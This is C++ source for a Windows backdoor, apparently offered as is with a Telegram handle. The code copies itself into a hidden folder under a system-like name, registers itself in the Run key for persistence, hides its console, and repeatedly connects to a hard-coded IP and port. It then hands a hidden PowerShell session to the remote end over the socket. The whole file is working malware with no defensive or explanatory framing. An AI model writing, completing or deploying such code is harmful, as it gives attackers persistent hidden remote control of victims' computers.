#include <ws2tcpip.h>
#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <process.h>
#include <iostream>
#include <string>
using namespace std;

#pragma comment(lib, "Ws2_32.lib")

// t.me/afterpeice

std::string commander = "172.29.226.172";
std::string street = "1991";

void AddToStartup(const std::string& fullPath) {
    HKEY hKey;
    const char* czStartName = "MyStartupApp";

    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {

        RegSetValueExA(hKey, czStartName, 0, REG_SZ, (BYTE*)fullPath.c_str(), fullPath.length());
        RegCloseKey(hKey);
    }
}

void InitSelf() { // initialisation management of itself
    char originalPath[MAX_PATH];
    GetModuleFileNameA(NULL, originalPath, MAX_PATH);

    std::string targetDir = "C:\\Users\\dimad\\AppData\\Local\\TaskHostW";
    std::string targetPath = targetDir + "\\freedom.exe";

    CreateDirectoryA(targetDir.c_str(), NULL);
    SetFileAttributesA(targetDir.c_str(), FILE_ATTRIBUTE_HIDDEN);
    CopyFileA(originalPath, targetPath.c_str(), FALSE);
    
    AddToStartup(targetPath);
}

int main(int argc, char* argv[])
{
    InitSelf();
    FreeConsole();

    WSADATA wsaData;
    SOCKET ConnectSocket;
    int  programme = WSAStartup(MAKEWORD(2, 2), &wsaData);
    struct addrinfo* out = NULL, * ptr = NULL, hints;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    while (true) {
        getaddrinfo(commander.c_str(), street.c_str(), &hints, &out);
        ptr = out;
        ConnectSocket = WSASocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, NULL, NULL);

        if (connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
            Sleep(5000);
            continue;
        }

        STARTUPINFO star;
        PROCESS_INFORMATION pr;
        ZeroMemory(&star, sizeof(star));
        star.cb = sizeof(star);
        ZeroMemory(&pr, sizeof(pr));
        star.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        star.wShowWindow = SW_HIDE;
        star.hStdInput = (HANDLE)ConnectSocket;
        star.hStdOutput = (HANDLE)ConnectSocket;
        star.hStdError = (HANDLE)ConnectSocket;
        TCHAR call[] = TEXT("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
        CreateProcess(NULL, call, NULL, NULL, TRUE, 0, NULL, NULL, &star, &pr);
        WaitForSingleObject(pr.hProcess, INFINITE);
        CloseHandle(pr.hProcess);
        CloseHandle(pr.hThread);

        closesocket(ConnectSocket);
    }
    
    WSACleanup();
}